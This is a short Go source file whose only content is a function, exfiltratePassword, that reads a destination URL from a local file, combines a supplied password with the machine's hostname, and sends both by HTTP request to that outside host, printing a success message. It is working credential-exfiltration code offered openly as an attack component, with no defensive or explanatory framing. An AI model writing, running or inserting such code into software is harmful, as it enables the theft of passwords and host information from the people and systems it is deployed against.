package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func exfiltratePassword(password string) {
	exfilLocationBytes, err := ioutil.ReadFile("exfil_location")
	if err != nil {
		fmt.Println("Error reading exfil location from file:", err)
		return
	}

	exfilLocation := strings.TrimSuffix(string(exfilLocationBytes), "\n")
	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting hostname:", err)
		return
	}
	payload := fmt.Sprintf("password=%s&hostname=%s", password, hostname)

	client := &http.Client{}
	req, err := http.NewRequest("GET", exfilLocation, strings.NewReader(payload))
	if err != nil {
		fmt.Println("Error creating HTTP request:", err)
		return
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending GET request:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Printf("Unexpected response status: %s\n", resp.Status)
		return
	}

	fmt.Println("pwd, and hostname exfiltrated successfully.")
}
